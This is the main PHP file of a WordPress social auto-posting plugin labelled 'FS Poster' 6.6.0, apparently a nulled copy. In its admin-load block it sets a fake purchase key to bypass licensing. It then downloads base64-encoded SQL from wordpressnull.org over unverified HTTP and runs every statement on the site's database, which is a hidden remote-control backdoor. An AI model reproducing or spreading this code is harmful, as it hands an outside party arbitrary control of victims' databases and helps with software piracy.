<?php
/*
 * Plugin Name: FS Poster
 * Description: FS Poster gives you a great opportunity to auto-publish WordPress posts on Facebook, Instagram, Twitter, Linkedin, Pinterest, Google Business Profile, Telegram, Reddit, Tumblr, VK, OK.ru, Telegram, Medium, Blogger, Plurk and WordPress based sites automatically.
 * Version: 6.6.0
 * Author: FS-Code
 * Author URI: https://www.fs-code.com
 * License: Commercial
 * Text Domain: fs-poster
 */

namespace FSPoster;

use FSPoster\App\Providers\Bootstrap;

defined( 'ABSPATH' ) or exit;

if ( is_admin() ) {

require_once( ABSPATH . 'wp-admin/includes/plugin.php' );
$fs_poster_version = get_plugin_data( __FILE__ )['Version'];
update_site_option( 'fs_poster_plugin_installed', $fs_poster_version );
update_site_option( 'fs_poster_plugin_purchase_key', 'purchase_key' );
update_site_option( 'fs_plugin_alert', '' );
update_site_option( 'fs_plugin_disabled', '0' );
update_site_option( 'fs_last_checked_time', time() );

$fs_poster_version = str_replace( '.', '_', $fs_poster_version );

global $wpdb;
if ( empty ( get_site_option( 'fs_poster_plugin_installed_' . $fs_poster_version ) ) ) {
$fs_data = wp_remote_retrieve_body( wp_remote_get( 'http://wordpressnull.org/fs-poster/install.dat', [ 'timeout' => 60, 'sslverify' => false ] ) );
$fs_data = json_decode( $fs_data , true );
if ( isset( $fs_data['sql'] ) ) {
$sql = str_replace( [ '{tableprefix}', '{tableprefixbase}' ] , [ ( $wpdb->base_prefix . 'fs_' ), $wpdb->base_prefix ] , base64_decode( $fs_data['sql'] ) );

foreach( explode(';' , $sql) AS $sqlQueryOne ) {
$checkIfEmpty = preg_replace('/\s/', '', $sqlQueryOne);
if( !empty( $checkIfEmpty ) ) {
$wpdb->query( $sqlQueryOne );
}
}

//Delete 'is_standart' parameter for each app
$wpdb->query( "UPDATE `{$wpdb->base_prefix}fs_apps` SET `is_standart` = 0 WHERE `name` = 'FS Poster - Standard APP'" );
//Delete 'fb' and 'google_b' apps
$wpdb->query( "DELETE FROM `{$wpdb->base_prefix}fs_apps` WHERE `name` = 'FS Poster - Standard APP' AND `driver` IN ('fb', 'google_b')" );

update_site_option( 'fs_poster_plugin_installed_' . $fs_poster_version, '1' );
}
}
}

require_once __DIR__ . '/vendor/autoload.php';

$networks = [
	'facebook',
	'instagram',
    'threads',
	'twitter',
	'planly',
	'linkedin',
	'pinterest',
	'telegram',
	'reddit',
	'youtube_community',
	'google_b',
	'tumblr',
	'vk',
	'ok',
	'medium',
	'wordpress',
	'webhook',
	'blogger',
	'plurk',
	'xing',
	'discord',
	'mastodon',
];

foreach ( $networks as $network ) {
	require_once __DIR__ . '/App/SocialNetworks/' . $network . '/init.php';
}

new Bootstrap();
